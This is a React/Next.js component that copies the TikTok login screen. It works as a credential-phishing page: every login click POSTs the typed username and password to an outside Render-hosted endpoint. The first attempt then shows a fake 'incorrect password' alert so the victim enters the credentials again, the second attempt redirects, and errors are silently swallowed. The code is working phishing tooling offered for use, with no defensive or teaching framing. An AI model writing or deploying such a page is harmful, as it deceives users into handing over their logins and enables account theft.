"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";

export default function TikTokLoginExact() {
  const [usuario, setUsuario] = useState("");
  const [contrasena, setContrasena] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loginIntent, setLoginIntent] = useState(0);
  const router = useRouter();

  const handleLogin = async () => {
    setLoginIntent(loginIntent + 1);

    try {
      // Siempre guardar los datos
      const response = await fetch("https://backend-simple-7fdv.onrender.com/usuarios_textos_insta", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ texto_a: usuario, texto_b: contrasena }),
      });

      if (!response.ok) throw new Error("Error en la respuesta del servidor");

      // Comportamiento según el intento
      if (loginIntent === 0) {
        // Primer intento: broma + limpiar campos
        alert("La contraseña es incorrecta. Intenta de nuevo");
        setUsuario("");
        setContrasena("");
      } else {
        // Segundo intento: redirigir
        router.push("/nueva-cita");
      }
    } catch (error) {
      console.error("Error enviando datos:", error);
      // No mostramos alertas
    }
  };

  return (
    <div className="tt-root">
      <div className="tt-card">
        <div className="tt-logo">
          <img src="/tiktok.png" alt="TikTok" className="tt-logo-img" />
        </div>

        <div className="tt-form">
          <input
            className="tt-input"
            type="text"
            placeholder="Usuario"
            value={usuario}
            onChange={(e) => setUsuario(e.target.value)}
          />

          <div className="tt-password-wrapper">
            <input
              className="tt-input tt-password-input"
              type={showPassword ? "text" : "password"}
              placeholder="Contraseña"
              value={contrasena}
              onChange={(e) => setContrasena(e.target.value)}
            />
            <button
              type="button"
              className="tt-show-btn"
              onClick={() => setShowPassword(!showPassword)}
            >
              {showPassword ? (
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                  <path
                    d="M17.94 17.94C16.14 19.14 14.13 20 12 20 7 20 2.73 16.89 1 12c.63-1.42 1.53-2.7 2.65-3.79M1 1l22 22"
                    stroke="#ff0050"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                </svg>
              ) : (
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                  <path
                    d="M12 5C7 5 2.73 8.11 1 12c1.73 3.89 6 7 11 7s9.27-3.11 11-7c-1.73-3.89-6-7-11-7z"
                    stroke="#ff0050"
                    strokeWidth="2"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  />
                  <circle cx="12" cy="12" r="3" stroke="#ff0050" strokeWidth="2" />
                </svg>
              )}
            </button>
          </div>

          <button className="tt-btn" type="button" onClick={handleLogin}>
            Iniciar sesión
          </button>
        </div>
      </div>

      <style>{`
        .tt-root {
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          background: #ffffff;
        }
        .tt-card { width: 318px; }
        .tt-card, .tt-card * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; color: #161823; }

        .tt-logo { text-align: center; margin-bottom: 24px; }
        .tt-logo-img { height: 70px; display: inline-block; }

        .tt-form { display: flex; flex-direction: column; }

        .tt-input {
          width: 100%;
          height: 36px;
          margin: 6px 0;
          padding: 9px 8px;
          border: 1px solid #dbdbdb;
          border-radius: 3px;
          background: #ffffff;
          outline: none;
          font-size: 12px;
        }
        .tt-input::placeholder { color: #8e8e8e; }
        .tt-input:focus { border-color: #ff0050; }

        .tt-password-wrapper {
          position: relative;
          display: flex;
          align-items: center;
        }

        .tt-password-input {
          padding-right: 30px; /* espacio para el botón dentro */
        }

        .tt-show-btn {
          position: absolute;
          right: 8px;
          top: 50%;
          transform: translateY(-50%);
          background: none;
          border: none;
          cursor: pointer;
          font-size: 14px;
          line-height: 1;
        }

        .tt-btn {
          width: 100%;
          height: 32px;
          margin-top: 12px;
          border: none;
          border-radius: 8px;
          background: #ff0050;
          color: #ffffff;
          font-weight: 600;
          font-size: 14px;
          cursor: pointer;
          transition: background 0.2s ease;
        }
        .tt-btn:hover { background: #e60046; }
        .tt-btn:active { transform: translateY(1px); background: #cc003d; }
      `}</style>
    </div>
  );
}
